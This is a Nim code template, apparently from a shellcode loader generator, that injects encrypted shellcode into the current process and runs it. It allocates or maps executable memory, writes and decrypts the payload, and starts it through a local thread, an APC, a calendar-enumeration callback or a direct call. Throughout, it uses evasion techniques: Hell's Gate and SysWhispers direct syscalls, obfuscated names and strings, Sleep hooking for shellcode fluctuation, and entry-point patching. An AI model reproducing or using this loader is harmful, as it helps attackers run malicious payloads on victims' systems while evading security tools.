let LocalInjectStub*  = """

    proc Wait(): void =
        when defined(wait):
            when defined(verbose):
                echo obf("Waiting for process to finish via WaitForSingleObject")
            when defined(DInvoke):
                discard MyWaitForSingleObject(-1, -1)
            else:
                WaitForSingleObject(-1, -1)
        else:
            discard

    proc pwndem[byte](friendlycode: openarray[byte]): void =

        when defined(Fluctuate):
            g_fluctuationData.shellcodeAddr = unsafeAddr friendlycode[0]
            g_fluctuationData.shellcodeSize = SIZE_T(friendlycode.len)
            # Will change the hardcoded key later on
            when defined(amd64):
                g_fluctuationData.encodeKey = 0x1337DE4D
            when defined(i386):
                g_fluctuationData.encodeKey = 0x1337
            g_fluctuationData.currentlyEncrypted = false
            g_fluctuationData.protect = PAGE_READWRITE
            g_fluctuate = FluctuateToRW
            if (hookSleep()):
                when defined(verbose):
                    echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
            else:
                when defined(verbose):
                    echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")

        var pHandle: HANDLE = -1
            
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID
            dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)
        

        when defined(Hellsgate):
            if getSyscall(ntAllocTable):
                syscall = ntAllocTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
        
        var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
        
        when defined(RX):
            protectionValue = PAGE_READWRITE
        when defined(RWX):
            protectionValue = PAGE_EXECUTE_READWRITE
        
        when defined(remoteMapSection):
            when not defined(AllocateDripStyle):
                when defined(Hellsgate):
                    if getSyscall(ntCreateSectionTable):
                        syscall = ntCreateSectionTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtCreateSection")
                
                # NtCreateSection Call
                var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
                var sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)
                var hMapFile: HANDLE
                var protectionValueCreate: DWORD = PAGE_EXECUTE_READWRITE
                when defined(Syswhispers):
                    status = iuhqdihasduiahsdaksdhak(cast[PHANDLE](&buffer),SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,ULONG(protectionValue),SEC_COMMIT,0)
                else:
                    status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValueCreate,SEC_COMMIT,0)
                when defined(verbose):
                    echo obf("[*] NtCreateSection: "), toHex(status)
                    #buffer = cast[LPVOID](&hMapFile)
                    #echo obf("[*] Address: "), repr(buffer)
                    #echo "This is the prompt"
                    #var input = readLine(stdin)
                if (hMapFile == 0):
                    echo obf("[-] Failed to create file mapping")
                
                when defined(Hellsgate):
                    if getSyscall(ntMapViewOfSectionTable):
                        syscall = ntMapViewOfSectionTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtMapViewOfSection")
            
                var
                    lpMapAddress: PVOID = NULL
                    vSize: SIZE_T = sc_size
                
                when defined(Syswhispers):
                    uihzasdbnqlpoasdlykxc(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)
                else:
                    status = NtMapViewOfSection(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)

                if not NT_SUCCESS(status):
                    when defined(verbose):
                        echo obf("[-] NtMapViewOfSection failed")
                        echo obf("[*] NTSTATUS: "), toHex(status)
                else:
                    buffer = lpMapAddress
                    when defined(verbose):
                        echo obf("[+] NtMapViewOfSection success!")
                        echo obf("[*] Address: "), repr(buffer)
                        #echo "This is the prompt"
                        #var input = readLine(stdin)

        else:
            when not defined(AllocateDripStyle):
                when defined(SysWhispers):
                    status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
                else:
                    status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)

                if not NT_SUCCESS(status):
                    when defined(verbose):
                        echo obf("[-] Failed to allocate memory.")
                        quit(1)
                else:
                    when defined(verbose):
                        when defined(RX):
                            echo obf("[+] Allocated a page of memory with PAGE_READWRITE permissions")
                        else:
                            echo obf("[+] Allocated a page of memory with PAGE_EXECUTE_READWRITE permissions")

        when defined(AllocateDripStyle):
            buffer = DripAllocate(HANDLE(-1), cast[SIZE_T](friendlycode.len), friendlycode)
            if buffer == nil:
                when defined(verbose):
                    echo obf("[-] DripAllocation Failed")
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] DripAllocation Success!")

                
        when not defined(AllocateDripStyle):
            var bytesWritten: SIZE_T
            when defined(Hellsgate):
                var 
                    ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
                    ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
        
                if getSyscall(ntWriteTable):

                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                
            when defined(SysWhispers):
                status = oqiazasusjk(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
            else:       
                status = NtWriteVirtualMemory(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
                    echo obf("[-] NTSTATUS: "), toHex(status)
                    quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
        
        when defined(JmpEntry):
            var newEntry: LPVOID
            newEntry = prepEntry(-1, buffer, jmpMod, jmpFunc)
            when defined(verbose):
                echo obf("[*] New Entry Point: "), toHex(cast[HANDLE](newEntry)), "\r\n"

        when not defined(AllocateDripStyle):
            when defined(RX): # we need to decrypt earlier, because we cannot without WRITE perms
                when defined(remoteMapSection):

                    when defined(Hellsgate):
                        if getSyscall(ntMapViewOfSectionTable):
                            syscall = ntMapViewOfSectionTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtMapViewOfSection")
                    var
                        lpMapAddress2: PVOID = NULL
                        vSize2: SIZE_T = sc_size
                    when defined(Syswhispers):
                        uihzasdbnqlpoasdlykxc(hMapFile,-1,&lpMapAddress2,0,0,NULL,&vSize2,2,0,PAGE_EXECUTE_READ)
                    else:
                        status = NtMapViewOfSection(hMapFile,-1,&lpMapAddress2,0,0,NULL,&vSize2,2,0,PAGE_EXECUTE_READ)

                    if not NT_SUCCESS(status):
                        when defined(verbose):
                            echo obf("[-] NtMapViewOfSection failed")
                            echo obf("[*] NTSTATUS: "), toHex(status)
                    else:
                        when defined(verbose):
                            echo obf("[+] NtMapViewOfSection success!")
                            echo obf("[*] Address: "), repr(lpMapAddress2)
                            #echo "This is the prompt"
                            #var input = readLine(stdin)
        
                    when defined(sleepinbetween):
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                    
                    # decrypt the first mapped RW section page
                    ptrEncText = cast[ptr byte](buffer)
                    ptrDecText = cast[ptr byte](buffer)
                    decryptLate()
                    
                    # Set the buffer address to our newly mapped RX page.
                    buffer = lpMapAddress2
                else:
                    when defined(sleepinbetween):
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                    
                    ptrEncText = cast[ptr byte](buffer)
                    ptrDecText = cast[ptr byte](buffer)
                    decryptLate()
                    when defined(Hellsgate):
                        if getSyscall(ntProtectTable):
                            syscall = ntProtectTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

                    when defined(syswhispers):
                        status = uashdiasdj(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
                    else:
                        status = NtProtectVirtualMemory(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
                    when defined(verbose):
                        echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
                        if (status == 0):
                            echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
                    if (status != 0):
                        when defined(verbose):
                            echo obf("[-] Failed to change permissions to PAGE_EXECUTE_READ")
                        quit(1)
        
        
        when defined(remoteMapSection):
            when defined(AllocateDripStyle):
                # we can now sleep && decrypt
                when defined(sleepinbetween):
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                when defined(verbose):
                    echo obf("[*] Decrypting the shellcode at address: "), toHex(cast[HANDLE](decryptbuffer)), "\r\n"
                echo "This is the prompt"
                var input = readLine(stdin)
                ptrEncText = cast[ptr byte](decryptbuffer)
                ptrDecText = cast[ptr byte](decryptbuffer)
                decryptLate()
                echo "This is the prompt"
                input = readLine(stdin)

        when defined(QueueAPC):
            var tHandle: HANDLE = -2
            when defined(Hellsgate):
                if getSyscall(ntQueueApcThreadTable):
                    syscall = ntQueueApcThreadTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtQueueApcThread")
            
            when defined(JmpEntry):
                buffer = newEntry

            let pfnAPC : PKNORMAL_ROUTINE = cast[PKNORMAL_ROUTINE](buffer)
            status = NtQueueApcThread(tHandle, pfnAPC, buffer, nil, nil)
            when defined(verbose):
                echo obf("[*] NtQueueApcThread: "), toHex(status)
            
            when defined(Hellsgate):
                if getSyscall(ntTestAlertTable):
                    syscall = ntTestAlertTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtTestAlert")
            
            status = NtTestAlert()
            when defined(verbose):
                echo obf("[*] NtTestAlert: "), toHex(status)
            
            when defined(JmpEntry):
                Sleep(1000)
                if(restoreBytes(-1, buffer)):
                    when defined(verbose):
                        echo obf("[*] Restored bytes!")
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to restore bytes!")

            return


        when defined(LocalCreateThread):
            var tHandle: HANDLE
            when defined(JmpEntry):
                buffer = newEntry
            when not defined(AllocateDripStyle):
                when not defined(RX):
                    when defined(sleepinbetween):
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                    ptrEncText = cast[ptr byte](buffer)
                    ptrDecText = cast[ptr byte](buffer)
                    decryptLate()

            when defined(SysWhispers):
                status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
                NtWaitForSingleObject(tHandle, 0, nil)
                when defined(JmpEntry):
                    Sleep(1000)
                    if(restoreBytes(-1, buffer)):
                        when defined(verbose):
                            echo obf("[*] Restored bytes!")
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to restore bytes!")
                Wait()
                status = zuatzuastdiasyy(tHandle)
                status = zuatzuastdiasyy(pHandle)
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
            else:    
                when defined(Hellsgate):
                    if getSyscall(ntCreateTable):
                        syscall = ntCreateTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtCreateThreadEx")
                status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                nil, 
                -1,
                buffer, 
                nil, FALSE, 0, 0, 0, nil)
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
                when defined(JmpEntry):
                    Sleep(1000)
                    if(restoreBytes(-1, buffer)):
                        when defined(verbose):
                            echo obf("[*] Restored bytes!")
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to restore bytes!")
                
                # Somehow not working
                #var TimeOut: LARGE_INTEGER = cast[LARGE_INTEGER](-1)
                #NtWaitForSingleObject(-1, 0, &TimeOut)
                Wait()
            when defined(Hellsgate):
                when defined(Hellsgate):
                    if getSyscall(ntCloseTable):
                        syscall = ntCloseTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtClose")
            status = NtClose(tHandle)
            status = NtClose(pHandle)
            return
            
        when defined(Callback):
            when defined(JmpEntry):
                buffer = newEntry
            when defined(AllocateDripStyle):
                when not defined(RX):
                    when defined(sleepinbetween):
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                    ptrEncText = cast[ptr byte](buffer)
                    ptrDecText = cast[ptr byte](buffer)
                    decryptLate()
            discard EnumCalendarInfoA(cast[CALINFO_ENUMPROCA](buffer),1,1,1)
            when defined(JmpEntry):
                Sleep(1000)
                if(restoreBytes(-1, buffer)):
                    when defined(verbose):
                        echo obf("[*] Restored bytes!")
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to restore bytes!")
            Wait()
        else:
            when defined(JmpEntry):
                buffer = newEntry
            when not defined(AllocateDripStyle):
                when not defined(RX):
                    when defined(sleepinbetween):
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                    ptrEncText = cast[ptr byte](buffer)
                    ptrDecText = cast[ptr byte](buffer)
                    decryptlate()
            #write(stdout, "This is the prompt -> ")
            #var input = readLine(stdin)
            let f = cast[proc(){.nimcall.}](buffer)
            f()
            when defined(JmpEntry):
                Sleep(1000)
                if(restoreBytes(-1, buffer)):
                    when defined(verbose):
                        echo obf("[*] Restored bytes!")
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to restore bytes!")
            Wait()

    pwndem(enctext)
    return 0

when not defined(proxy):
    when not defined(service):
        when not defined(cloned):
            discard main(nil)

when defined(defaultMain):
    when not defined(service):
        when not defined(cloned):
            discard main(nil)
"""
